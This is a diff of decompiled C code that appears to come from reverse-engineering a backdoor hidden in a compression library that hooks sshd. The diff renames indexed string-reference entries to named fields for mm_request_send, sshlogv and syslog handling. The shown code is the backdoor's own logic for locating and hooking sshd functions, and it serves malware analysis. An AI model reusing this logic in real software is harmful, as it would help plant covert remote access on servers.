@@ -377,9 +377,9 @@ LAB_00105951:
           code_segment = elf_get_data_segment(local_980.elf_handles.sshd,(u64 *)&local_a30,FALSE);
           sshd_code_end_ptr = local_a30.instruction;
           if ((code_segment != (void *)0x0) &&
-             (local_980.sshd_string_refs.entries[0x12].func_start != (void *)0x0)) {
-            sshd_ctx_cursor->mm_request_send_start = local_980.sshd_string_refs.entries[0x12].func_start;
-            sshd_ctx_cursor->mm_request_send_end = local_980.sshd_string_refs.entries[0x12].func_end;
+             (local_980.sshd_string_refs.mm_request_send.func_start != (void *)0x0)) {
+            sshd_ctx_cursor->mm_request_send_start = local_980.sshd_string_refs.mm_request_send.func_start;
+            sshd_ctx_cursor->mm_request_send_end = local_980.sshd_string_refs.mm_request_send.func_end;
             local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x400);
             pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_a98,(void *)0x0);
             sshd_ctx_cursor->STR_without_password = pcVar37;
@@ -527,10 +527,10 @@ LAB_001064b8:
       local_9d8.instruction = (u8 *)0xf0000000e;
       hooks = (backdoor_hooks_data_t *)0x0;
       do {
-        sshd_code_end_ptr = (u8 *)local_980.sshd_string_refs.entries
+        sshd_code_end_ptr = (u8 *)(&local_980.sshd_string_refs.xcalloc_zero_size)
                         [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_start;
         if (sshd_code_end_ptr != (u8 *)0x0) {
-          payload_end = (u8 *)local_980.sshd_string_refs.entries
+          payload_end = (u8 *)(&local_980.sshd_string_refs.xcalloc_zero_size)
                           [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_end;
           search_hit_count = search_hit_count + 1;
           BVar26 = find_instruction_with_mem_operand(sshd_code_end_ptr,payload_end,(dasm_ctx_t *)0x0,tls_slot);
@@ -561,28 +561,28 @@ LAB_001065af:
   code_segment = elf_get_code_segment(&local_980.main_info,&local_a98);
   signed_data_size = local_a98;
   if ((((code_segment != (void *)0x0) && (0x10 < local_a98)) &&
-      ((u8 *)local_980.sshd_string_refs.entries[0x19].func_start != (u8 *)0x0)) &&
+      ((u8 *)local_980.sshd_string_refs.sshlogv_format.func_start != (u8 *)0x0)) &&
      (((local_b10->global_ctx).uses_endbr64 == FALSE ||
       (BVar26 = is_endbr64_instruction
-                          ((u8 *)local_980.sshd_string_refs.entries[0x19].func_start,
-                           (u8 *)((long)local_980.sshd_string_refs.entries[0x19].func_start + 4),
+                          ((u8 *)local_980.sshd_string_refs.sshlogv_format.func_start,
+                           (u8 *)((long)local_980.sshd_string_refs.sshlogv_format.func_start + 4),
                            0xe230), BVar26 != FALSE)))) {
-    sshd_log_ctx->sshlogv = local_980.sshd_string_refs.entries[0x19].func_start;
+    sshd_log_ctx->sshlogv = local_980.sshd_string_refs.sshlogv_format.func_start;
     insn_ctx_cursor = &local_a30;
     for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
       *(undefined4 *)&insn_ctx_cursor->instruction = 0;
       insn_ctx_cursor = (dasm_ctx_t *)((long)insn_ctx_cursor + (ulong)zero_seed * -8 + 4);
     }
-    if ((u8 *)local_980.sshd_string_refs.entries[0x1a].func_start != (u8 *)0x0) {
-      local_b48 = (u8 *)local_980.sshd_string_refs.entries[0x1a].func_start;
+    if ((u8 *)local_980.sshd_string_refs.syslog_bad_level.func_start != (u8 *)0x0) {
+      local_b48 = (u8 *)local_980.sshd_string_refs.syslog_bad_level.func_start;
       local_b20 = (u8 *)0x0;
       sshd_code_end_ptr = (u8 *)0x0;
       do {
         while( TRUE ) {
-          if ((local_980.sshd_string_refs.entries[0x1a].func_end <= local_b48) ||
+          if ((local_980.sshd_string_refs.syslog_bad_level.func_end <= local_b48) ||
              ((local_b20 != (u8 *)0x0 && (sshd_code_end_ptr != (u8 *)0x0)))) goto LAB_00106bf0;
           BVar26 = x86_dasm(&local_a30,local_b48,
-                            (u8 *)local_980.sshd_string_refs.entries[0x1a].func_end);
+                            (u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end);
           if (BVar26 != FALSE) break;
           local_b48 = local_b48 + 1;
         }
@@ -629,12 +629,12 @@ LAB_001067fb:
           }
           payload_end = (u8 *)0x0;
           lzma_code_end = local_b48;
-          for (; (lzma_code_end < local_980.sshd_string_refs.entries[0x1a].func_end && (log_string_slot < 5));
+          for (; (lzma_code_end < local_980.sshd_string_refs.syslog_bad_level.func_end && (log_string_slot < 5));
               log_string_slot = log_string_slot + 1) {
             if ((payload_end != (u8 *)0x0) && (sshd_code_end_ptr != (u8 *)0x0)) goto LAB_00106b3c;
             BVar26 = find_mov_instruction
-                               (lzma_code_end,(u8 *)local_980.sshd_string_refs.entries[0x1a].func_end,TRUE
-                                ,FALSE,&local_9d8);
+                               (lzma_code_end,(u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end,
+                                TRUE,FALSE,&local_9d8);
             if (BVar26 == FALSE) break;
             if ((local_9d8.prefix.flags_u16 & 0x1040) != 0) {
               if ((local_9d8.prefix.flags_u16 & 0x40) == 0) {
@@ -744,8 +744,8 @@ LAB_00106b3c:
             }
             do {
               BVar26 = find_instruction_with_mem_operand_ex
-                                 (sshd_code_end_ptr,(u8 *)local_980.sshd_string_refs.entries[0x1a].func_end,
-                                  &local_9d8,0x147,(void *)0x0);
+                                 (sshd_code_end_ptr,(u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end
+                                  ,&local_9d8,0x147,(void *)0x0);
               if (BVar26 == FALSE) break;
               if ((local_9d8.imm_zeroextended == 0) && ((local_9d8.prefix.flags_u16 & 0x100) != 0))
               {
@@ -766,7 +766,7 @@ LAB_00106b3c:
             } while (local_9d8.instruction +
                      CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                               (undefined4)local_9d8.instruction_size) <
-                     local_980.sshd_string_refs.entries[0x1a].func_end);
+                     local_980.sshd_string_refs.syslog_bad_level.func_end);
             goto LAB_00106ab1;
           }
         }
